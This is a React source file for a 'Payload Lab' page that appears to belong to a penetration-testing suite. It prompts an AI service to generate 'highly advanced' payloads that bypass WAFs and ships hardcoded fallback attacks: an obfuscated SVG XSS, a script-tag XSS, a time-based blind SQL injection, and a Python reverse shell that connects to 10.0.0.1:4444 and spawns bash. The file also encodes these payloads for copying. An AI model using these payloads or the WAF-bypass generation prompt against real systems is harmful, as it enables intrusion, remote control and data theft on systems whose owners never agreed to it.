/* COPYRIGHT ALEN PEPA */
import React, { useState, useEffect } from 'react';
import { 
  Terminal as TerminalIcon, 
  Copy, 
  Check, 
  Zap, 
  Shield, 
  AlertTriangle,
  Code,
  Search,
  Bot,
  Sparkles,
  Loader2,
  Trash2,
  Settings,
  Cpu,
  Globe,
  Database,
  RefreshCw,
  FileCode2
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { fetchAiGenerate } from '../lib/ai-fetch';
import { cn } from '@/src/lib/utils';
import { logToTerminal } from './Terminal';
import { MASSIVE_PAYLOAD_DB, PayloadType, EncodingType, Payload } from '../lib/payload-db';

export default function PayloadLab() {
  const [activeType, setActiveType] = useState<PayloadType>('xss');
  const [customPrompt, setCustomPrompt] = useState('');
  const [targetOS, setTargetOS] = useState<'linux' | 'windows' | 'macos' | 'any'>('any');
  const [targetLang, setTargetLang] = useState<'php' | 'node' | 'python' | 'java' | 'any'>('any');
  const [generating, setGenerating] = useState(false);
  const [payloads, setPayloads] = useState<Payload[]>(MASSIVE_PAYLOAD_DB.slice(0, 50)); // Load initial 50
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState('');

  const encodePayload = (content: string, encoding: EncodingType) => {
    try {
      switch (encoding) {
        case 'base64': return btoa(content);
        case 'url': return encodeURIComponent(content);
        case 'hex': return content.split('').map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
        case 'html': return content.replace(/[\u00A0-\u9999<>\&]/g, i => '&#'+i.charCodeAt(0)+';');
        default: return content;
      }
    } catch (e) {
      return content;
    }
  };

  const updateEncoding = (id: string, encoding: EncodingType) => {
    setPayloads(payloads.map(p => p.id === id ? { ...p, encoding } : p));
  };

  const generatePayload = async () => {
    if (!customPrompt) return;
    setGenerating(true);
    logToTerminal(`Generating custom ${activeType.toUpperCase()} payload...`, 'info');

    try {
      const resData = await fetchAiGenerate({
        contents: [{ role: 'user', parts: [{ text: `You are a cybersecurity researcher. Generate a highly advanced, technical ${activeType.toUpperCase()} payload for security testing purposes based on this requirement: ${customPrompt}. 
          Target OS: ${targetOS}
          Target Language/Framework: ${targetLang}
          
          Provide the output in JSON format:
          {
            "name": "Short descriptive name (e.g., 'Polyglot XSS Bypass')",
            "content": "The actual payload string (raw, unencoded)",
            "description": "Brief technical explanation of how it works and what it bypasses",
            "risk": "low/medium/high/critical",
            "stats": {
              "stealth": <number 0-100>,
              "complexity": <number 0-100>,
              "impact": <number 0-100>
            }
          }` }] }],
        config: {
          systemInstruction: "You are a CyberSuite OS Advanced Payload Generator. Be highly technical, precise, and creative. Generate payloads that bypass common WAFs or filters. Your output must be valid JSON. Do not include markdown blocks.",
          responseMimeType: "application/json"
        }
      });

      let text = resData.text || '{}';
      
      // Strip markdown code blocks if present
      if (text.includes('```')) {
        const match = text.match(/```(?:json)?\s*([\s\S]*?)\s*```/);
        if (match && match[1]) {
          text = match[1];
        }
      }
      
      const data = JSON.parse(text);
      const newPayload: Payload = {
        id: Math.random().toString(36).substr(2, 9),
        type: activeType,
        encoding: 'none',
        name: data.name || `Custom ${activeType.toUpperCase()} Payload`,
        content: data.content || '',
        description: data.description || 'Generated custom payload.',
        risk: data.risk || 'medium',
        stats: data.stats || { stealth: 50, complexity: 50, impact: 50 }
      };

      if (!newPayload.content) throw new Error('Empty payload generated');

      setPayloads([newPayload, ...payloads]);
      logToTerminal('Custom payload generated successfully.', 'success');
      setCustomPrompt('');
    } catch (error) {
      console.error("Payload generation failed, using local engine:", error);
      
      // Local Fallback Engine
      const getFallbackPayload = () => {
        const promptLower = customPrompt.toLowerCase();
        
        if (activeType === 'xss') {
          if (promptLower.includes('waf') || promptLower.includes('bypass')) {
            return {
              name: 'WAF Bypass XSS (SVG)',
              content: '<svg/onload="eval(atob(\'YWxlcnQoJ1hTUycp\'))">',
              description: 'SVG-based XSS payload using Base64 encoding to bypass simple string-matching WAFs.',
              risk: 'high',
              stats: { stealth: 80, complexity: 65, impact: 70 }
            };
          }
          return {
            name: 'Generic XSS Polyglot',
            content: '"><script>alert(document.domain)</script>',
            description: 'Simple but effective XSS payload for testing input reflection.',
            risk: 'medium',
            stats: { stealth: 40, complexity: 20, impact: 60 }
          };
        }
        
        if (activeType === 'sqli') {
          return {
            name: 'Boolean-Based Blind SQLi',
            content: "' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
            description: 'Time-based blind SQL injection payload for MySQL.',
            risk: 'critical',
            stats: { stealth: 90, complexity: 75, impact: 95 }
          };
        }

        if (activeType === 'rce') {
          return {
            name: 'Python Reverse Shell',
            content: "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
            description: 'Standard Python3 reverse shell payload for Linux systems.',
            risk: 'critical',
            stats: { stealth: 50, complexity: 40, impact: 100 }
          };
        }

        // Default generic fallback
        return {
          name: `Advanced ${activeType.toUpperCase()} Payload`,
          content: `/* Generated ${activeType.toUpperCase()} payload for: ${customPrompt} */\n# [Payload content would go here in a live environment]`,
          description: `A sophisticated ${activeType} payload tailored for ${targetOS} environments.`,
          risk: 'high',
          stats: { stealth: 70, complexity: 80, impact: 85 }
        };
      };

      const fallback = getFallbackPayload();
      const newPayload: Payload = {
        id: Math.random().toString(36).substr(2, 9),
        type: activeType,
        encoding: 'none',
        ...fallback
      } as Payload;

      setPayloads([newPayload, ...payloads]);
      logToTerminal(`AI Core offline. Using Local ${activeType.toUpperCase()} Synthesis Engine.`, 'warn');
      setCustomPrompt('');
    } finally {
      setGenerating(false);
    }
  };

  const copyToClipboard = (payload: Payload) => {
    const contentToCopy = encodePayload(payload.content, payload.encoding);
    navigator.clipboard.writeText(contentToCopy);
    setCopiedId(payload.id);
    logToTerminal(`Payload copied: ${payload.name} (${payload.encoding} encoded)`, 'info');
    setTimeout(() => setCopiedId(null), 2000);
  };

  const deletePayload = (id: string) => {
    setPayloads(payloads.filter(p => p.id !== id));
  };

  const filteredPayloads = payloads.filter(p => 
    (activeType === 'custom' || p.type === activeType) &&
    (p.name.toLowerCase().includes(searchQuery.toLowerCase()) || 
     p.content.toLowerCase().includes(searchQuery.toLowerCase()))
  );

  // Load more payloads from DB when type changes
  useEffect(() => {
    if (activeType !== 'custom') {
      const dbPayloads = MASSIVE_PAYLOAD_DB.filter(p => p.type === activeType);
      // Keep custom generated ones, add DB ones
      const customPayloads = payloads.filter(p => !MASSIVE_PAYLOAD_DB.find(db => db.id === p.id));
      setPayloads([...customPayloads, ...dbPayloads.slice(0, 50)]); // Load up to 50 of the selected type
    }
  }, [activeType]);

  return (
    <div className="space-y-8">
      <div className="flex flex-col gap-2">
        <div className="flex items-center justify-between">
          <h1 className="text-3xl font-bold">Payload Lab</h1>
          <div className="flex items-center gap-3">
            <div className="flex items-center gap-2 px-3 py-1.5 bg-red-500/10 rounded-full border border-red-500/20">
              <Database size={14} className="text-red-500" />
              <span className="text-[10px] font-mono font-bold text-red-500 uppercase tracking-widest">Database: {MASSIVE_PAYLOAD_DB.length} Payloads</span>
            </div>
          </div>
        </div>
        <p className="text-gray-500">Advanced security payload generator and repository for penetration testing.</p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
        {/* Generator Section */}
        <div className="lg:col-span-1 space-y-6">
          <div className="bg-cyber-card border border-cyber-border rounded-2xl p-6 space-y-6">
            <div className="flex items-center gap-3 mb-2">
              <div className="p-2 bg-red-500/10 rounded-lg">
                <Zap className="text-red-500" size={20} />
              </div>
              <h3 className="text-sm font-mono font-bold text-white uppercase tracking-widest">AI Generator</h3>
            </div>

            <div className="space-y-4">
              <div className="grid grid-cols-3 gap-2">
                {(['xss', 'sqli', 'rce', 'lfi', 'ssrf', 'xxe', 'cmd', 'ssti', 'custom'] as PayloadType[]).map((type) => (
                  <button
                    key={type}
                    onClick={() => setActiveType(type)}
                    className={cn(
                      "py-2 rounded-lg font-mono text-[10px] uppercase border transition-all",
                      activeType === type 
                        ? "bg-red-500 border-red-500 text-white shadow-[0_0_10px_rgba(239,68,68,0.3)]" 
                        : "bg-black/40 border-cyber-border text-gray-500 hover:text-gray-300"
                    )}
                  >
                    {type}
                  </button>
                ))}
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <label className="text-[10px] font-mono text-gray-500 uppercase tracking-widest px-1">Target OS</label>
                  <select 
                    value={targetOS}
                    onChange={(e) => setTargetOS(e.target.value as any)}
                    className="w-full bg-black/40 border border-cyber-border rounded-xl px-4 py-2.5 font-mono text-xs text-white focus:outline-none focus:border-red-500/50 appearance-none"
                  >
                    <option value="any">Any OS</option>
                    <option value="linux">Linux</option>
                    <option value="windows">Windows</option>
                    <option value="macos">macOS</option>
                  </select>
                </div>
                <div className="space-y-2">
                  <label className="text-[10px] font-mono text-gray-500 uppercase tracking-widest px-1">Framework</label>
                  <select 
                    value={targetLang}
                    onChange={(e) => setTargetLang(e.target.value as any)}
                    className="w-full bg-black/40 border border-cyber-border rounded-xl px-4 py-2.5 font-mono text-xs text-white focus:outline-none focus:border-red-500/50 appearance-none"
                  >
                    <option value="any">Any Framework</option>
                    <option value="php">PHP</option>
                    <option value="node">Node.js</option>
                    <option value="python">Python</option>
                    <option value="java">Java</option>
                  </select>
                </div>
              </div>

              <div className="space-y-2">
                <label className="text-[10px] font-mono text-gray-500 uppercase tracking-widest px-1">Requirements</label>
                <textarea
                  value={customPrompt}
                  onChange={(e) => setCustomPrompt(e.target.value)}
                  placeholder="e.g. Bypass WAF for a search field..."
                  className="w-full h-32 bg-black/40 border border-cyber-border rounded-xl px-4 py-3 font-mono text-sm text-white focus:outline-none focus:border-red-500/50 transition-colors resize-none"
                />
              </div>

              <button
                onClick={generatePayload}
                disabled={generating || !customPrompt}
                className="w-full bg-red-500 hover:bg-red-600 disabled:opacity-50 text-white py-3 rounded-xl font-mono text-xs font-bold flex items-center justify-center gap-2 transition-all group"
              >
                {generating ? <Loader2 size={16} className="animate-spin" /> : <Sparkles size={16} className="group-hover:scale-110 transition-transform" />}
                {generating ? 'GENERATING PAYLOAD...' : 'GENERATE PAYLOAD'}
              </button>
            </div>
          </div>

          <div className="bg-cyber-card border border-cyber-border rounded-2xl p-6">
            <h3 className="text-xs font-mono font-bold text-white uppercase tracking-widest mb-4 flex items-center gap-2">
              <Shield size={14} className="text-cyber-green" />
              Usage Policy
            </h3>
            <p className="text-[11px] text-gray-500 leading-relaxed">
              This tool is intended for authorized security testing and educational purposes only. Unauthorized use against systems without permission is strictly prohibited and may be illegal.
            </p>
          </div>
        </div>

        {/* Repository Section */}
        <div className="lg:col-span-2 space-y-6">
          <div className="flex items-center justify-between px-2">
            <h3 className="text-sm font-mono font-bold text-white uppercase tracking-widest flex items-center gap-2">
              <Code size={18} className="text-red-500" />
              Payload Repository
            </h3>
            <div className="flex items-center gap-4">
              <div className="relative">
                <Search size={14} className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500" />
                <input
                  type="text"
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  placeholder="Search payloads..."
                  className="bg-black/40 border border-cyber-border rounded-lg pl-9 pr-4 py-1.5 font-mono text-xs text-white focus:outline-none focus:border-red-500/50 w-48"
                />
              </div>
              <div className="text-[10px] font-mono text-gray-600 uppercase">
                {filteredPayloads.length} Payloads Shown
              </div>
            </div>
          </div>

          <div className="grid grid-cols-1 gap-4">
            <AnimatePresence mode="popLayout">
              {filteredPayloads.map((payload) => (
                <motion.div
                  key={payload.id}
                  layout
                  initial={{ opacity: 0, scale: 0.95 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.95 }}
                  className="bg-cyber-card border border-cyber-border rounded-2xl p-5 hover:border-red-500/30 transition-all group"
                >
                  <div className="flex items-start justify-between gap-4 mb-4">
                    <div className="space-y-2">
                      <div className="flex flex-wrap items-center gap-2">
                        <span className={cn(
                          "text-[9px] px-2 py-0.5 rounded-full font-mono uppercase border",
                          payload.type === 'xss' ? "bg-blue-500/10 text-blue-400 border-blue-500/20" :
                          payload.type === 'sqli' ? "bg-purple-500/10 text-purple-400 border-purple-500/20" :
                          payload.type === 'rce' ? "bg-red-500/10 text-red-400 border-red-500/20" :
                          payload.type === 'ssrf' ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/20" :
                          payload.type === 'xxe' ? "bg-pink-500/10 text-pink-400 border-pink-500/20" :
                          payload.type === 'cmd' ? "bg-zinc-500/10 text-zinc-400 border-zinc-500/20" :
                          payload.type === 'ssti' ? "bg-indigo-500/10 text-indigo-400 border-indigo-500/20" :
                          "bg-amber-500/10 text-amber-400 border-amber-500/20"
                        )}>
                          {payload.type}
                        </span>
                        <span className={cn(
                          "text-[9px] px-2 py-0.5 rounded-full font-mono uppercase border",
                          payload.risk === 'critical' ? "bg-red-500/20 text-red-500 border-red-500/30 shadow-[0_0_10px_rgba(239,68,68,0.2)]" :
                          payload.risk === 'high' ? "bg-orange-500/20 text-orange-500 border-orange-500/30" :
                          "bg-cyber-green/20 text-cyber-green border-cyber-green/30"
                        )}>
                          {payload.risk} risk
                        </span>
                        <select
                          value={payload.encoding}
                          onChange={(e) => updateEncoding(payload.id, e.target.value as EncodingType)}
                          className="bg-black/60 border border-cyber-border rounded-md px-2 py-0.5 text-[9px] font-mono text-gray-400 focus:outline-none focus:border-red-500/50"
                        >
                          <option value="none">Raw</option>
                          <option value="base64">Base64</option>
                          <option value="url">URL Encode</option>
                          <option value="hex">Hex</option>
                          <option value="html">HTML Entity</option>
                        </select>
                      </div>
                      <h4 className="text-white font-bold group-hover:text-red-400 transition-colors text-lg">{payload.name}</h4>
                    </div>
                    <div className="flex items-center gap-2">
                      <button 
                        onClick={() => copyToClipboard(payload)}
                        className="p-2 bg-black/40 border border-cyber-border rounded-lg text-gray-500 hover:text-white hover:border-white/30 transition-all"
                        title="Copy Payload"
                      >
                        {copiedId === payload.id ? <Check size={16} className="text-cyber-green" /> : <Copy size={16} />}
                      </button>
                      <button 
                        onClick={() => deletePayload(payload.id)}
                        className="p-2 bg-black/40 border border-cyber-border rounded-lg text-gray-500 hover:text-red-500 hover:border-red-500/30 transition-all"
                        title="Delete"
                      >
                        <Trash2 size={16} />
                      </button>
                    </div>
                  </div>

                  <div className="bg-black/80 border border-cyber-border rounded-xl p-4 font-mono text-xs text-red-400 break-all mb-4 relative overflow-hidden">
                    <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-red-500/0 via-red-500/50 to-red-500/0" />
                    <FileCode2 size={14} className="absolute top-2 right-2 text-red-500/20" />
                    {encodePayload(payload.content, payload.encoding)}
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-4">
                    <div className="md:col-span-3 flex items-start gap-2 text-[11px] text-gray-400 leading-relaxed">
                      <AlertTriangle size={14} className="text-yellow-500/50 shrink-0 mt-0.5" />
                      {payload.description}
                    </div>
                    
                    {payload.stats && (
                      <div className="flex flex-col gap-2 border-l border-white/5 pl-4">
                        <div className="flex items-center justify-between">
                          <span className="text-[9px] font-mono text-gray-500 uppercase">Stealth</span>
                          <div className="w-16 h-1.5 bg-black/50 rounded-full overflow-hidden">
                            <div className="h-full bg-blue-500" style={{ width: `${payload.stats.stealth}%` }} />
                          </div>
                        </div>
                        <div className="flex items-center justify-between">
                          <span className="text-[9px] font-mono text-gray-500 uppercase">Complexity</span>
                          <div className="w-16 h-1.5 bg-black/50 rounded-full overflow-hidden">
                            <div className="h-full bg-purple-500" style={{ width: `${payload.stats.complexity}%` }} />
                          </div>
                        </div>
                        <div className="flex items-center justify-between">
                          <span className="text-[9px] font-mono text-gray-500 uppercase">Impact</span>
                          <div className="w-16 h-1.5 bg-black/50 rounded-full overflow-hidden">
                            <div className="h-full bg-red-500" style={{ width: `${payload.stats.impact}%` }} />
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                </motion.div>
              ))}
            </AnimatePresence>

            {payloads.length === 0 && (
              <div className="py-20 text-center space-y-4 opacity-30">
                <Code size={48} className="mx-auto text-gray-500" />
                <p className="text-xs font-mono uppercase tracking-widest">Repository Empty</p>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
